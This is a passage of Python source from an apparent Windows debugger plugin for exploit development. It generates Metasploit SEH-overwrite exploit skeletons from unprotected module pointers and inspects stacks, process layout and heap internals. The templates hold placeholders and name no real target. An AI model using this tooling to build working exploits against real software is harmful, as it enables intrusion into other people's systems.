			dbg.log("------------------------------")
			dbg.logLines(targetstr.replace("  ","    "))
			dbg.log("")
			dbg.log("Metasploit 'exploit' function :")
			dbg.log("--------------------------------")
			dbg.logLines(exploitstr.replace("  ","    "))
			
			#write skeleton
			objexploitfile.write(skeletonheader+"\n",exploitfile)
			objexploitfile.write(skeletoninit+"\n",exploitfile)
			objexploitfile.write(targetstr,exploitfile)
			objexploitfile.write(skeletoninit2,exploitfile)		
			objexploitfile.write(exploitstr,exploitfile)
			objexploitfile.write("end",exploitfile)					
			
	
	if isSEH:
		dbg.log("[+] Attempting to create payload for SEH record overwrite...")
		sehcriteria = criteria
		modulecriteria["safeseh"] = False
		modulecriteria["rebase"] = False
		modulecriteria["aslr"] = False
		modulecriteria["os"] = False
		sehptr = 0
		instrinfo = ""
		if isSEHUnicode:
			sehcriteria["unicode"] = True
			if "nonull" in sehcriteria:
				sehcriteria.pop("nonull")
		modulecriteria["safeseh"] = False
		#get SEH pointers
		silent = True
		ptr_counter = 0
		ptr_to_get = 1					
		seh_pointers = findSEH(modulecriteria,sehcriteria)
		jmpback = False
		silent = False
		if not isSEHUnicode:
			#did we find a pointer ?
			if len(seh_pointers) == 0:
				#did we try to avoid nulls ?
				dbg.log("[+] No non-null pointers found, trying 'jump back' layout now...")
				if "nonull" in sehcriteria:
					if sehcriteria["nonull"] == True:
						sehcriteria.pop("nonull")
						silent = True
						ptr_counter = 0
						ptr_to_get = 1									
						seh_pointers = findSEH(modulecriteria,sehcriteria)
						silent = False
						jmpback = True
			if len(seh_pointers) != 0:
				for ptrtypes in seh_pointers:
					sehptr = seh_pointers[ptrtypes][0]
					instrinfo = ptrtypes
					break
		else:
			if len(seh_pointers) == 0:
				sehptr = 0
			else:
				for ptrtypes in seh_pointers:
					sehptr = seh_pointers[ptrtypes][0]
					instrinfo = ptrtypes
					break
				
		if sehptr != 0:
			ptrx = MnPointer(sehptr)
			modname = ptrx.belongsTo()
			mixin = ""
			if not jmpback:
				mixin += "#Don't forget to include the SEH mixin !\n"
				mixin += "include Msf::Exploit::Seh\n\n"
				skeletonheader += "  include Msf::Exploit::Seh\n"

			targetstr = "      'Targets'    =>\n"
			targetstr += "        [\n"
			targetstr += "          [ '<fill in the OS/app version here>',\n"
			targetstr += "            {\n"
			if not isSEHUnicode:
				targetstr += "              'Ret'     =>  0x" + toHex(sehptr) + ", # " + instrinfo + " - " + modname + "\n"
				targetstr += "              'Offset'  =>  " + str(initialoffsetSEH) + "\n"							
			else:
				origptr = toHex(sehptr)
				#real unicode ?
				unicodeptr = ""
				transforminfo = ""
				if origptr[0] == "0" and origptr[1] == "0" and origptr[4] == "0" and origptr[5] == "0":					
					unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
				else:
					#transform
					transform = UnicodeTransformInfo(origptr)
					transformparts = transform.split(",")
					transformsubparts = transformparts[0].split(" ")
					origptr = transformsubparts[len(transformsubparts)-1]
					transforminfo = " #unicode transformed to 0x" + toHex(sehptr)
					unicodeptr = "\"\\x" + origptr[6] + origptr[7] + "\\x" + origptr[2] + origptr[3] + "\""
				targetstr += "              'Ret'     =>  " + unicodeptr + "," + transforminfo + " # " + instrinfo + " - " + modname + "\n"
				targetstr += "              'Offset'  =>  " + str(initialoffsetSEH) + "  #Unicode\n"						
			targetstr += "            }\n"
			targetstr += "          ],\n"
			targetstr += "        ],\n"

			exploitstr = "  def exploit\n\n"
			if exploittype.find("network") > -1:
				exploitstr += "\n    connect\n\n"
			
			if not isSEHUnicode:
				if not jmpback:
					exploitstr += "    buffer = rand_text(target['Offset'])  #junk\n"
					exploitstr += "    buffer << generate_seh_rec_ord(target.ret)\n"
					exploitstr += "    buffer << payload.encoded  #" + str(shellcodesizeSEH) +" bytes of space\n"
					exploitstr += "    # more junk may be needed to trigger the exception\n"
				else:
					exploitstr += "    jmp_back = Rex::Arch::X86.jmp_short(-payload.encoded.length-5)\n\n"
					exploitstr += "    buffer = rand_text(target['Offset'] - payload.encoded.length - jmp_back.length)  #junk\n"
					exploitstr += "    buffer << payload.encoded\n"
					exploitstr += "    buffer << jmp_back  #jump back to start of payload.encoded\n"
					exploitstr += "    buffer << '\\xeb\\xf9\\x41\\x41'  #nseh, jump back to jmp_back\n"
					exploitstr += "    buffer << [target.ret].pack('V')  #seh\n"
			else:
				exploitstr += "    nseh = <insert 2 bytes that will acts as nseh walkover>\n"
				exploitstr += "    align = <insert routine to align a register to begin of payload and jump to it>\n\n"
				exploitstr += "    padding = <insert bytes to fill space between alignment code and payload>\n\n"
				exploitstr += "    # Metasploit requires double encoding for unicode : Use alpha_xxxx encoder in the payload section\n"
				exploitstr += "    # and then manually encode with unicode inside the exploit section :\n\n"
				exploitstr += "    enc = framework.encoders.create('x86/unicode_mixed')\n\n"
				exploitstr += "    register_to_align_to = <fill in the register name you will align to>\n\n"
				exploitstr += "    enc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })\n\n"
				exploitstr += "    unicodepayload = enc.encode(payload.encoded, nil, nil, platform)\n\n"
				exploitstr += "    buffer = rand_text(target['Offset'])  #unicode junk\n"
				exploitstr += "    buffer << nseh  #Unicode walkover friendly dword\n"
				exploitstr += "    buffer << target['Ret']  #Unicode friendly p/p/r\n"
				exploitstr += "    buffer << align\n"
				exploitstr += "    buffer << padding\n"
				exploitstr += "    buffer << unicodepayload\n"
				
			if exploittype.find("network") > -1:
				exploitstr += "\n    print_status(\"Trying target #{target.name}...\")\n"					
				exploitstr += "    sock.put(buffer)\n\n"
				exploitstr += "    handler\n"
			if exploittype == "fileformat":
				exploitstr += "\n    file_create(buffer)\n\n"						
			if exploittype.find("network") > -1:
				exploitstr += "    disconnect\n\n"						
				
			exploitstr += "  end\n"
			if mixin != "":
				dbg.log("Metasploit 'include' section :")
				dbg.log("------------------------------")
				dbg.logLines(mixin)
			dbg.log("Metasploit 'Targets' section :")
			dbg.log("------------------------------")
			dbg.logLines(targetstr.replace("  ","    "))
			dbg.log("")
			dbg.log("Metasploit 'exploit' function :")
			dbg.log("--------------------------------")
			dbg.logLines(exploitstr.replace("  ","    "))
			
			
			#write skeleton
			objexploitfile_seh.write(skeletonheader+"\n",exploitfile_seh)
			objexploitfile_seh.write(skeletoninit+"\n",exploitfile_seh)
			objexploitfile_seh.write(targetstr,exploitfile_seh)
			objexploitfile_seh.write(skeletoninit2,exploitfile_seh)		
			objexploitfile_seh.write(exploitstr,exploitfile_seh)
			objexploitfile_seh.write("end",exploitfile_seh)					
			
		else:
			dbg.log("    Unable to suggest a buffer layout because I couldn't find any good pointers",highlight=1)
	
	return	

#-----stacks-----#
def procStacks(args):
	stacks = getStacks()
	if len(stacks) > 0:
		dbg.log("Stacks :")
		dbg.log("--------")

		stackDict = {}
		headers = ["Thread ID", "Start", "End", "Size", "Info"]
		types = ["string", "pointer", "pointer", "pointer", "string"]
		alreadyPrinted = False
		for threadid in stacks:
			s = stacks[threadid]
			if isinstance(s, dict):
				dbg.log("Thread ID: %s | TEB: 0x%s | Size: 0x%s" % (
					str(threadid), toHex(s["teb"]), toHex(s["size"])))
				alreadyPrinted = True
			else:

				startaddress = s[0]
				endaddress = s[1]
				size = s[1] - s[0]
				info = ""
				if __DEBUGGERAPP__ == "WinDBG":
					info = clickPageAcl(startaddress)
				stackDict[str(threadid)] = [startaddress, endaddress, size, info]

		if not alreadyPrinted:
			print_dict_table(stackDict, headers, types, padding = "    ", itemsequence = [])	


	else:
		dbg.log("No threads/stacks found !",highlight=1)
	return


#-----proclayout-----#

def procLayout(args):
	global silent
	silent = True
	include_chunks = False

	# Filter aliases -> internal region types they expand to
	filter_map = {
		"peb":       set(["PEB"]),
		"teb":       set(["TEB"]),
		"mod":       set(["Module"]),
		"stack":     set(["Stack"]),
		"heap":      set(["Heap", "Heap Segment"]),
		"chunks":    set(["Heap", "Heap Segment", "Heap Chunk"]),
		"vablocks":  set(["Heap", "Heap Segment", "Heap VA Block"]),
		"all":       set(["PEB", "TEB", "Module", "Stack", "Heap", "Heap Segment", "Heap Chunk", "Heap VA Block"]),
	}
	all_internal = set(["PEB", "TEB", "Module", "Stack", "Heap", "Heap Segment", "Heap Chunk", "Heap VA Block"])
	# By default, hide chunks and VA blocks
	default_categories = all_internal - set(["Heap Chunk", "Heap VA Block"])
	valid_filters = sorted(filter_map.keys())

	show_all = "a" in args or "all" in args

	# Base selection: -f/-filter replaces categories, -a/all shows everything,
	# default shows broad view (without chunks/VA blocks).
	if "f" in args or "filter" in args:
		filterval = args.get("f", args.get("filter", ""))
		if type(filterval).__name__.lower() == "bool":
			dbg.log("Please provide a comma-separated list of types to show with -f", highlight=1)
			dbg.log("Valid types: %s" % ", ".join(valid_filters), highlight=1)
			silent = False
			return
		filter_names = [x.strip().lower() for x in filterval.split(",")]
		show_categories = set()
		for fn in filter_names:
			if fn in filter_map:
				show_categories |= filter_map[fn]
			else:
				dbg.log("Unknown filter '%s', ignoring" % fn, highlight=1)
		if len(show_categories) == 0:
			dbg.log("No valid types matched filter '%s'" % filterval, highlight=1)
			dbg.log("Valid types: %s" % ", ".join(valid_filters), highlight=1)
			silent = False
			return
	elif show_all:
		show_categories = set(all_internal)
	else:
		show_categories = set(default_categories)

	# Additive selection: -t/-type expands the currently selected categories.
	# "all" is excluded here — use -a or -f all for that.
	additive_filters = sorted(k for k in filter_map if k != "all")
	if "t" in args or "type" in args:
		typeval = args.get("t", args.get("type", ""))
		if type(typeval).__name__.lower() == "bool":
			dbg.log("Please provide a comma-separated list of types to add with -t", highlight=1)
			dbg.log("Valid types: %s" % ", ".join(additive_filters), highlight=1)
			silent = False
			return
		type_names = [x.strip().lower() for x in typeval.split(",")]
		added = False
		for tn in type_names:
			if tn in filter_map and tn != "all":
				show_categories |= filter_map[tn]
				added = True
			else:
				dbg.log("Unknown type '%s', ignoring (use -a or -f all to show everything)" % tn if tn == "all" else "Unknown type '%s', ignoring" % tn, highlight=1)
		if not added:
			dbg.log("No valid types were added with -t '%s'" % typeval, highlight=1)
			dbg.log("Valid types: %s" % ", ".join(additive_filters), highlight=1)

	# Force chunk walking if chunks will be displayed
	if "Heap Chunk" in show_categories:
		include_chunks = True

	# -s elements / -sort elements: use getSortedByElement (hierarchical, indents baked in)
	# -s base / -sort base or default: use getAllSorted (flat, category-transition indents)
	_sort_val   = args.get("s", args.get("sort", "base"))
	if type(_sort_val).__name__.lower() == "bool":
		_sort_val = "base"
	_sort_val = _sort_val.strip().lower()
	if _sort_val in ["elem", "element"]:
		_sort_val = "elements"
	element_mode = _sort_val == "elements"

	# Flush cache if -walk is specified
	if "walk" in args:
		resetGlobals()
		dbg.log("Cache flushed, re-walking process...")

	category_mappings = {}
	category_mappings["PEB"] = "dt _peb @$peb"
	category_mappings["TEB"] = "!mona pl -f teb; !teb"
	category_mappings["Stack"] = "!mona pl -f stack"
	category_mappings["Heap"] = "!mona heap"
	category_mappings["Heap Segment"] = "!mona pl -f heap"
	category_mappings["Module"] = "!mona mod"
	category_mappings["Heap Chunk"] = "!mona pl -f chunks"
	category_mappings["Heap VA Block"] = "!mona pl -f vablocks"
	category_mappings["Heap Chunk"] = "!mona pl -f chunks"

	populate_entities = set()
	if "PEB" in show_categories:
		populate_entities.add("peb")
	if "TEB" in show_categories:
		populate_entities.add("teb")
	if "Stack" in show_categories:
		populate_entities.add("stacks")
	if "Module" in show_categories:
		populate_entities.add("modules")
	if show_categories & {"Heap", "Heap Segment", "Heap VA Block", "Heap Chunk"}:
		populate_entities.add("heaps")
		populate_entities.add("defaultheap")
		populate_entities.add("ntheapdetail")
	if "Heap Chunk" in show_categories:
		populate_entities.add("chunks")
	dbg.log("[+] Populating process layout%s..." % (" (with chunk detail)" if include_chunks else ""))
	dbg.log("    Sort mode: %s" % _sort_val)
	_ensureMnProc(entities=sorted(populate_entities), include_chunks=include_chunks)
	
	# Build the flat region list for display.
	# element_mode uses getSortedByElement: the hierarchy is walked recursively and
	# indentation is baked directly into the description string before filtering.
	# flat mode uses getAllSorted: indentation is inferred from category transitions
	# in the display loop below.
	if element_mode:
		_indent_by_level = ["", "  \\_ ", "    \\_ "]
		def _flatten_hierarchical(items, level=0):
			prefix = _indent_by_level[min(level, len(_indent_by_level) - 1)]
			out = []
			for s, e, cat, desc, children in items:
				out.append((s, e, cat, prefix + desc))
				out.extend(_flatten_hierarchical(children, level + 1))
			return out
		regions = [r for r in _flatten_hierarchical(mnproc.getSortedByElement()) if r[2] in show_categories]
	else:
		regions = [r for r in mnproc.getAllSorted() if r[2] in show_categories]

	if len(regions) == 0:
		dbg.log("No regions found!", highlight=1)
		silent = False
		return

	filename = "proclayout.txt"
	objfile = MnLog(filename)
	logfile = objfile.reset()
	dbg.log("")
	# Use sequential idx as dict key to avoid address collisions (e.g. Heap
	# header and first Heap Segment share the same start address). The actual
	# start address is conveyed to print_dict_table via key_col.
	table_data = OrderedDict()
	table_seq = []
	table_starts = []       # parallel start-address list for key_col
	seen_regions = set()   # (start, category) pairs to suppress true duplicates

	in_heap_chain = False
	prev_category = ""
	for idx, region in enumerate(regions):
		start, end, category, description = region[0], region[1], region[2], region[3]
		size  = end - start if end > start else 0
		psize = "0x%x" % size
		# In element_mode indentation is already baked into description; in flat mode
		# infer it from category transitions so heap children are visually nested.
		indent = ""
		if not element_mode:
			# Infer visual nesting from category transitions (flat list has no
			# explicit depth, so track heap chain state across iterations).
			# Segments and VA Blocks sit at the same level as their Heap;
			# only Chunks are indented to show they belong to a Segment.
			if category in ("Heap", "Heap Segment", "Heap VA Block"):
				in_heap_chain = True
			elif category == "Heap Chunk":
				indent = "  \\_ "
			else:
				in_heap_chain = False
		prev_category = category
		# Deduplicate truly identical (start, category) pairs (e.g. a segment
		# walked twice). Different categories at the same start are kept
		# (Heap header + first Heap Segment both begin at the heap base).
		dedup_key = (start, category)
		if dedup_key in seen_regions:
			continue
		seen_regions.add(dedup_key)
		table_data[idx] = (end, psize, category, indent + description)
		table_seq.append(idx)
		table_starts.append(start)

	headers = ["Start", "End", "Size", "Type", "Description"]
	types   = ["pointer", "pointer", "Size", "string", "string"]
	print_dict_table(table_data, headers, types, itemsequence=table_seq, logobj=objfile, logfile=logfile, padding="    ", key_col=table_starts)

	dbg.log("")
	dbg.log("Total: %d entities" % len(table_seq))
	objfile.write("Total: %d entities" % len(table_seq), logfile)

	# Summary
	summaryDict = {}
	summarySeq = []
	for entry_key in table_seq:
		if not entry_key in table_data:
			continue
		entry_data = table_data[entry_key]
		if len(entry_data) < 3:
			continue
		category = entry_data[2]
		if category in summaryDict:
			currentcnt, currentcmd = summaryDict[category]
			currentcnt += 1
			summaryDict[category] = [currentcnt, currentcmd]
		else:
			category_cmd = ""
			if category in category_mappings:
				category_cmd = category_mappings[category]
			summaryDict[category] = [1, clickCategoryCmd(category_cmd)]
			summarySeq.append(category)

	dbg.log("")
	dbg.log("[+] Summary:")
	dbg.log("")
	headers = ["Category", "Number", "More info"]
	types   = ["string", "int", "string"]
	print_dict_table(summaryDict, headers, types, itemsequence=summarySeq, padding="    ")

	dbg.log("")

	dbg.log("[+] This process layout was sorted by '%s'" % _sort_val)
	other_type = ""
	if _sort_val == "base":
		other_type = "elements"
	else:
		other_type = "base"
	type_cmd = "!mona pl -s %s" % other_type
	dbg.log("    You can sort by '%s' using the following command: %s" % (other_type, clickWinDBGCmd(type_cmd)))
	dbg.log("")
	silent = False
	return


#------heapstuff-----#
	
def procHeap(args):

	os = dbg.getOsVersion()
	heapkey = 0

	#first, print list of heaps
	allheaps = []
	try:
		allheaps = dbg.getHeapsAddress()
	except:
		allheaps = []
	dbg.log("Peb : %s, NtGlobalFlag : 0x%08x" % (PTR_PRINT % MnPEB.get_address(),getNtGlobalFlag()))
	dbg.log("Heaps:")
	dbg.log("------")
	if len(allheaps) > 0:
		for heap in allheaps:
			segments = getSegmentList(heap)
			segmentlist = []
			for segment in segments:
				segmentlist.append(segment)
			if not win7mode:
				segmentlist.sort()
			segmentinfo = ""
			for segment in segmentlist:
				segmentinfo = segmentinfo + "%s" % (PTR_PRINT % segment) + ","
			segmentinfo = segmentinfo.strip(",")
			segmentinfo = " : " + segmentinfo
			defheap = ""
			lfhheap = ""
			keyinfo = ""
			if heap == getDefaultProcessHeap():
				defheap = "* Default process heap"
			if win7mode:
				iHeap = MnHeap(heap)
				if iHeap.isCorrupted():
					nt_sig = None
					seg_sig = None
					try:
						nt_sig = iHeap.getSignature()
					except:
						pass
					try:
						seg_sig = iHeap.getSegmentHeapSignature()
					except:
						pass
					sigdetail = ""
					if nt_sig is not None:
						sigdetail += " NT sig: 0x%08x" % nt_sig
					if seg_sig is not None:
						sigdetail += " Seg sig: 0x%08x" % seg_sig
					dbg.log("0x%08x ** CORRUPTED ** (type: %s,%s) %s" % (heap, iHeap.getHeapType(), sigdetail, defheap), highlight=1)
					continue
				if iHeap.usesLFH():
					lfhheapaddress = iHeap.getLFHAddress()
					lfhheap = "[LFH enabled, _LFH_HEAP at 0x%08x]" % lfhheapaddress
				if iHeap.getEncodingKey() > 0:
					keyinfo = "Encoding key: 0x%016x" % iHeap.getEncodingKey()
			else:
				iHeap = MnHeap(heap)
				if iHeap.isCorrupted():
					dbg.log("0x%08x ** CORRUPTED ** (type: %s) %s" % (heap, iHeap.getHeapType(), defheap), highlight=1)
					continue
			dbg.log("%s (%d segment(s)%s) %s %s %s" % ((PTR_PRINT % heap),len(segments),segmentinfo,defheap,lfhheap,keyinfo))
	else:
		dbg.log(" ** No heaps found")
	dbg.log("")

	heapbase = 0
	searchtype = ""
	searchtypes = ["lal","lfh","all","segments", "chunks", "layout", "fea", "bea"]
	error = False
	filterafter = ""
	
	showdata = False
	findvtablesize = True
	expand = False

	minstringlength = 32
	
	if len(allheaps) > 0:
		if "h" in args and type(args["h"]).__name__.lower() != "bool":
			hbase = args["h"].replace("0x","").replace("0X","")
			if not (isAddress(hbase) or hbase.lower() == "default"):
				dbg.log("%s is an invalid address" % args["h"], highlight=1)
				return
			else:
				if hbase.lower() == "default":
					heapbase = getDefaultProcessHeap()
				else:
					heapbase = hexStrToInt(hbase)
	
		if "t" in args:
			if type(args["t"]).__name__.lower() != "bool":
				searchtype = args["t"].lower().replace('"','').replace("'","")
				if searchtype == "blocks":
					dbg.log("** Note : type 'blocks' has been replaced with 'chunks'",highlight=1)
					dbg.log("")
					searchtype = "chunks"
				if not searchtype in searchtypes:
					searchtype = ""
			else:
				searchtype = ""

		if "after" in args:
			if type(args["after"]).__name__.lower() != "bool":
				filterafter = args["after"].replace('"','').replace("'","")
				
		if "v" in args:
			showdata = True
			
		if "expand" in args:
			expand = True
			
		if "fast" in args:
			findvtablesize = False 
			showdata = False
		
		if searchtype == "" and not "stat" in args:
			dbg.log("You can further refine your search by specifying a valid searchtype -t",highlight=1)
			dbg.log("Valid values are :",highlight=1)
			vallist = []
			for val in searchtypes:
				if val != "blocks":	
					vallist.append(val)
			dbg.log("   %s" % ','.join(vallist),highlight=1)
			error = True

		if "h" in args and heapbase == 0:
			dbg.log("Please specify a valid heap base address -h",highlight=1)
			error = True

		if "size" in args:
			if type(args["size"]).__name__.lower() != "bool":
				size = args["size"].lower()
				if size.startswith("0x"):
					minstringlength = hexStrToInt(size)
				else:
					minstringlength = int(size)
			else:
				dbg.log("Please provide a valid size -size",highlight=1)
				error = True

		if "clearcache" in args:
			dbg.forgetKnowledge("vtableCache")
			dbg.log("[+] vtableCache cleared.")
	
	else:
		dbg.log("No heaps found",highlight=1)
		return
	
	heap_to_query = []
	heapfound = False
	
	if "h" in args:
		for heap in allheaps:
			if heapbase == heap:
				heapfound = True
				heap_to_query = [heapbase]
		if not heapfound:
			error = True
			dbg.log("0x%08x is not a valid heap base address" % heapbase,highlight=1)
	else:
		#show all heaps
		for heap in allheaps:
			heap_to_query.append(heap)
	
	if error:
		return
	else:
		statinfo = {}
		logfile_b = ""
		thislog_b = ""
		logfile_l = ""
		logfile_l = ""

		if searchtype == "chunks" or searchtype == "all":
			logfile_b = MnLog("heapchunks.txt")
			thislog_b = logfile_b.reset()

		if searchtype == "layout" or searchtype == "all":
			logfile_l = MnLog("heaplayout.txt")
			thislog_l = logfile_l.reset()

		for heapbase in heap_to_query:
			mHeap = MnHeap(heapbase)
			heapbase_extra = ""
			heapidx = allheaps.index(heapbase) if heapbase in allheaps else 0
			#heapname = "Heap %d" % heapidx
			heapname = clickHeapWinDBG(heapbase, "nt", "Heap %d" % heapidx)
			if heapbase == getDefaultProcessHeap():
				heapname += " [Default]"
			frontendinfo = []
			frontendheapptr = 0
			frontendheaptype = 0
			if win7mode:
				heapkey = mHeap.getEncodingKey()
				if mHeap.usesLFH():
					frontendheaptype = 0x2
					heapbase_extra = " [LFH] "
					frontendheapptr = mHeap.getLFHAddress()
			frontendinfo = [frontendheaptype,frontendheapptr]
				
			dbg.log("")
			dbg.log("[+] Processing heap 0x%08x - %s%s" % (heapbase, heapname, heapbase_extra))

			if searchtype == "fea":
				if win7mode:
					searchtype = "lfh"
				else:
					searchtype = "lal"
			if searchtype == "bea":
					searchtype = "freelist"

			# LookAsideList
			if searchtype == "lal" or (searchtype == "all" and not win7mode):
				lalindex = 0
				if win7mode:
					dbg.log(" !! This version of the OS doesn't have a LookAside List !!")
				else:
					dbg.log("[+] FrontEnd Allocator : LookAsideList")
					dbg.log("[+] Getting LookAsideList for heap 0x%08x" % heapbase)
					# do we have a LAL for this heap ?
					FrontEndHeap = mHeap.getFrontEndHeap()
					if FrontEndHeap > 0:
						dbg.log("    FrontEndHeap: 0x%08x" % FrontEndHeap)
						fea_lal = mHeap.getLookAsideList()
						dbg.log("    Nr of (non-empty) LookAside Lists : %d" % len(fea_lal))
						dbg.log("")
						for lal_table_entry in sorted(fea_lal.keys()):
							expectedsize = lal_table_entry * 8
							nr_of_chunks = len(fea_lal[lal_table_entry])
							lalhead = struct.unpack('<L',dbg.readMemory(FrontEndHeap + (0x30 * lal_table_entry),4))[0]
							dbg.log("LAL [%d] @0x%08x, Expected Chunksize 0x%x (%d), Flink : 0x%08x" % (lal_table_entry,FrontEndHeap + (0x30 * lal_table_entry),expectedsize,expectedsize,lalhead))
							mHeap.showLookAsideHead(lal_table_entry)
							dbg.log("  %d chunks:" % nr_of_chunks)
							for chunkindex in fea_lal[lal_table_entry]:
								lalchunk = fea_lal[lal_table_entry][chunkindex]
								chunksize = lalchunk.size * 8
								flag = getHeapFlag(lalchunk.flag)
								data = ""
								if showdata:
									data = bin2hex(dbg.readMemory(lalchunk.userptr,16))
								dbg.log("     ChunkPtr: 0x%08x, UserPtr: 0x%08x, Flink: 0x%08x, ChunkSize: 0x%x, UserSize: 0x%x, Userspace: 0x%x (%s) %s" % (lalchunk.chunkptr, lalchunk.userptr,lalchunk.flink,chunksize,lalchunk.usersize,lalchunk.usersize+lalchunk.remaining,flag,data))
								if chunksize != expectedsize:
									dbg.log("               ^^ ** Warning - unexpected size value, header corrupted ? **",highlight=True)
							dbg.log("")
					else:
						dbg.log("[+] No LookAsideList found for this heap")
						dbg.log("")

			if searchtype == "lfh" or (searchtype == "all" and win7mode):
				dbg.log("[+] FrontEnd Allocator : Low Fragmentation Heap")
				dbg.log("     ** Not implemented yet **")
				
			if searchtype == "freelist" or searchtype == "all":
				dbg.log("[+] BackEnd Allocator : FreeLists")
				if not isinstance(mHeap, MnNTXPHeap):
					dbg.log("     ** Not implemented yet **")
				else:
					dbg.log("[+] Getting FreeLists for heap 0x%08x" % heapbase)

					# XP-only: show FreeListsInUseBitmap
					thisfreelistinusebitmap = mHeap.getFreeListInUseBitmap()
					if thisfreelistinusebitmap:
						bitmapstr = ""
						for bit in thisfreelistinusebitmap:
							bitmapstr += str(bit)
						dbg.log("[+] FreeListsInUseBitmap:")
						printDataArray(bitmapstr,32,prefix="    ")

					# Unified bin display — works on XP, Vista/7, 8/10/11
					freebins = mHeap.getFreeBins()
					gran = heapgranularity
					total_free = 0

					# Build segment index-to-address map
					seglist = mHeap.getHeapSegmentList()
					seg_sorted = sorted(seglist.keys())
					def _seg_label(segid):
						segaddr = seg_sorted[segid] if segid < len(seg_sorted) else 0
						return "Segment%02d-%02d - 0x%08x" % (segid, heapidx, segaddr)

					dbg.log("")
					dbg.log("    Bin  ExpSize                                Chunks")
					dbg.log("    ---  ------------------------------------   ------")

					for binidx in range(128):
						chunks = freebins.get(binidx, [])
						count = len(chunks)
						total_free += count
						if binidx == 0:
							label = "(ExpSize: >0x%x blocks | >0x%x bytes)" % (127, 127 * gran)
						else:
							label = "(ExpSize: 0x%x blocks | 0x%x bytes)" % (binidx, binidx * gran)
						if count > 0:
							dbg.log("")
							dbg.log("    ---------------------------------------------------------")
							dbg.log("    [%3d] %-40s %d" % (binidx, label, count))
							dbg.log("")
							for i, chunk in enumerate(chunks):
								chunksize = chunk.size * gran
								freesize = chunksize - chunk.headersize
								if binidx == 0:
									dbg.log("           0x%08x (Size: 0x%x blocks | 0x%x bytes | UserSize: 0x%x blocks | 0x%x bytes) [Segment: %s]" % (chunk.chunkptr, chunk.size, chunksize, freesize // gran, freesize, _seg_label(chunk.segment)))
								else:
									userblocks = freesize // gran
									dbg.log("           0x%08x (UserSize: 0x%x blocks | 0x%x bytes) [Segment: %s]" % (chunk.chunkptr, userblocks, freesize, _seg_label(chunk.segment)))
								if i < count - 1:
									dbg.log("             |")
									dbg.log("             V")

					dbg.log("")
					dbg.log("[+] Total free chunks: %d across %d bins" % (total_free, len(freebins)))
					dbg.log("")

			if searchtype == "layout" or searchtype == "all":
				segments = getSegmentsForHeap(heapbase)

				sortedsegments = []
				# read vtableCache from knowledge
				mnproc.vtableCache = dbg.getKnowledge("vtableCache")
				if mnproc.vtableCache is None:
					mnproc.vtableCache = {}

				for seg in segments:
					sortedsegments.append(seg)
				if not win7mode:
					sortedsegments.sort()
				segmentcnt = 0
				minstringlen = minstringlength
				blockmem = []
				nr_filter_matches = 0

				vablocks = []
				# VirtualAllocdBlocks
				vachunks = mHeap.getVirtualAllocdBlocks()
				infoblocks = {}
				infoblocks["segments"] = sortedsegments
				if expand:
					infoblocks["virtualallocdblocks"] = [vachunks]

				for infotype in infoblocks:
					heapdata = infoblocks[infotype]
					for thisdata in heapdata:
						if infotype == "segments":
							seg = thisdata
							segmentcnt += 1
							segstart = segments[seg][0]
							segend = segments[seg][1]
							FirstEntry = segments[seg][2]
							LastValidEntry = segments[seg][3]								
							datablocks = walkSegment(FirstEntry,LastValidEntry,heapbase)
							tolog = "----- Heap 0x%08x%s, Segment 0x%08x - 0x%08x (%d/%d) -----" % (heapbase,heapbase_extra,segstart,segend,segmentcnt,len(sortedsegments))

						if infotype == "virtualallocdblocks":
							datablocks = heapdata[0]
							tolog = "----- Heap 0x%08x%s, VirtualAllocdBlocks : %d" % (heapbase,heapbase_extra,len(datablocks))

						logfile_l.write(" ",thislog_l)								
						dbg.log(tolog)
						logfile_l.write(tolog,thislog_l)

						sortedblocks = []
						for block in datablocks:
							sortedblocks.append(block)
						sortedblocks.sort()								

						# for each block, try to get info
						# object ?
						# BSTR ?
						# str ?
						for block in sortedblocks:
							showinlog = False
							thischunk = datablocks[block]
							if infotype == "virtualallocdblocks":
								vainfo = thischunk
								unused = 0
								headersize = 0
								flags = ""
								userptr = block
								psize = 0
								selfsize = vainfo["commit_size"]
								blocksize = selfsize
								usersize = selfsize
								extratxt = ""
								nextblock = 0
							else:
								unused = thischunk.unused
								headersize = thischunk.headersize
								flags = getHeapFlag(thischunk.flag)
								userptr = block + headersize
								psize = thischunk.prevsize * 8
								blocksize = thischunk.size * 8
								selfsize = blocksize
								usersize = blocksize - unused
								extratxt = ""
							# read block into memory
							blockmem = dbg.readMemory(block,blocksize)

							# first, find all strings (ascii, unicode and BSTR)
							asciistrings = {}
							unicodestrings = {}
							bstr = {}
							objects = {}
							asciistrings = getAllStringOffsets(blockmem,minstringlen)

							# determine remaining subsets of the original block
							remaining = {}
							curpos = 0
							for stringpos in asciistrings:
								if stringpos > curpos:
									remaining[curpos] = stringpos - curpos
									curpos = asciistrings[stringpos]
							if curpos < blocksize:
								remaining[curpos] = blocksize

							# search for unicode in remaining subsets only - tx for the regex help Turboland !
							for remstart in remaining:
								remend = remaining[remstart]
								thisunicodestrings = getAllUnicodeStringOffsets(blockmem[remstart:remend],minstringlen,remstart)
								# append results to master list
								for tus in thisunicodestrings:
									unicodestrings[tus] = thisunicodestrings[tus]

							# check each unicode, maybe it's a BSTR
							tomove = []
							for unicodeoffset in unicodestrings:
								delta = unicodeoffset
								size = (unicodestrings[unicodeoffset] - unicodeoffset)/2
								if delta >= 4:
									maybesize = struct.unpack('<L',blockmem[delta-3:delta+1])[0] # it's an offset, remember ?
									if maybesize == (size*2):
										tomove.append(unicodeoffset)
										bstr[unicodeoffset] = unicodestrings[unicodeoffset]
							for todel in tomove:
								del unicodestrings[todel]

							# get objects too
							# find all unique objects
							# again, just store offset
							objects = {}
							orderedobj = []
							if __DEBUGGERAPP__ == "WinDBG":
								nrlines = int(float(blocksize) / 4)
								cmd2run = "dds 0x%08x L 0x%x" % ((block + headersize),nrlines)
								output = dbg.nativeCommand(cmd2run)
								outputlines = output.split("\n")
								for line in outputlines:
									if line.find("::") > -1 and line.find("vftable") > -1:
										parts = line.split(" ")
										objconstr = ""
										if len(parts) > 3:
											objectptr = hexStrToInt(parts[0])
											cnt = 2
											objectinfo = ""
											while cnt < len(parts):
												objectinfo += parts[cnt] + " "
												cnt += 1
											parts2 = line.split("::")
											parts2name = ""
											pcnt = 0
											while pcnt < len(parts2)-1:
												parts2name = parts2name + "::" + parts2[pcnt]
												pcnt += 1
											parts3 = parts2name.split(" ")
											if len(parts3) > 3:
												objconstr = parts3[3]
											if not objectptr in objects:
